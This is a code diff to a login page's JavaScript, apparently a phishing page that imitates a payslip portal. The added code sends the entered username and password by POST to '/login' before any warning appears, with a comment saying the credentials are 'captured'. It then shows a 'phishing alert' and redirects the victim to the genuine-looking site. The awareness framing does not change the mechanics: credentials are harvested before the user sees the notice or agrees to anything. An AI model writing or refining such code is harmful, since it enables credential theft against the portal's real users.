@@ -198,7 +198,7 @@
         document.getElementById('loginButton').addEventListener('click', function(e) {
             e.preventDefault();
             
-            // Validate username and password before showing popup
+            // Validate username and password before submitting
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
             const usernameError = document.getElementById('usernameError');
@@ -220,9 +220,23 @@
                 isValid = false;
             }
             
-            // Only show popup if form is valid
+            // Submit form first if valid, then show popup
             if (isValid) {
-                showPhishingAlert();
+                // Create a form data object to send via fetch
+                const formData = new FormData(document.getElementById('loginForm'));
+                
+                // Fetch request to submit the form data
+                fetch('/login', {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    // Show phishing alert after credentials are captured
+                    showPhishingAlert();
+                }).catch(error => {
+                    console.error('Error:', error);
+                    // Still show the phishing alert even if there was an error
+                    showPhishingAlert();
+                });
             }
         });
         
@@ -281,8 +295,8 @@
                 }
             }).then((result) => {
                 if (result.isConfirmed) {
-                    // Submit the form after showing the phishing awareness notification
-                    document.getElementById('loginForm').submit();
+                    // Redirect to the original site
+                    window.location.href = "https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f";
                 }
             });
         }
